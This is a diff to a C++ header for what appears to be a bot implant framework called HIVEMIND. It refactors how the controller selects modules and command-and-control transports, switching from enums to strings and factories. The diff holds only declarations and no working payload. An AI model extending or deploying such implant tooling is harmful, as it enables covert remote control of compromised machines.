@@ -1,11 +1,13 @@
 #ifndef HIVEMIND_IMPLANTFRAMEWORK_LIB_INCLUDE_LOGIC_CONTROLLER_HPP_
 #define HIVEMIND_IMPLANTFRAMEWORK_LIB_INCLUDE_LOGIC_CONTROLLER_HPP_
-#include "transport.hpp"
 #include "module.hpp"
+#include "transport.hpp"
 #include "debugging.hpp"
 #include "comms.hpp"
 #include "json.hpp"
 #include "hivemind.h"
+#include "module_factory.hpp"
+#include "transport_factory.hpp"
 
 #include <map>
 #include <string>
@@ -14,13 +16,9 @@
 #include <boost/thread/mutex.hpp>
 #include <csignal>
 
-#ifdef _WIN32
-#include "windows.hpp"
-#elif __linux__
-#include "linux.hpp"
-#else
-#error Unsuppored OS
-#endif
+// ######## THIS IS CREATED BY CMAKE ########
+#include "all_headers.hpp"
+// ##########################################
 
 namespace hivemind_lib {
 
@@ -50,7 +48,7 @@ class LogicController {
   /**
    * @brief The method to use for transport
    */
-  TransportEnum transport_method_;
+  std::string transport_method_;
   /**
    * @brief Modules this bot can run and where they are located
    */
@@ -58,7 +56,7 @@ class LogicController {
   /**
    * @brief The transport, used for C&C communications
    */
-  std::unique_ptr<Transport> transport_;
+  std::shared_ptr<Transport> transport_;
   /**
    * @brief Contains the info for this implant.
    */
@@ -139,6 +137,7 @@ class LogicController {
    * @brief Start the registration process
    */
   int RegisterBot();
+
   /**
    * @brief Start the communication with the C&C server, this is an infinite loop.
    */
@@ -146,22 +145,22 @@ class LogicController {
 
   /**
    * @brief Add a module to the logic controller.
-   * @param mod Module to add
+   * @param module Module to add
    */
-  void AddModule(ModuleEnum mod);
+  void AddModule(const std::string& module);
 
   /**
    * @brief Set the transportation method for C&C traffic
-   * @param transport_enum The transport method to use
+   * @param transport The transport method to use
    */
-  void SetTransportMethod(TransportEnum transport_enum);
+  void SetTransportMethod(const std::string& transport);
 
   /**
    * @brief Initialize the communication method.
    * @param hostname Host to connect to for C&C
    * @param port Port, optional for some transports, to connect to for C&C
    */
-  void InitComms(std::string hostname, std::string port = "");
+  void InitComms(const std::string &hostname, const std::string &port = "");
 };
 }
 #endif
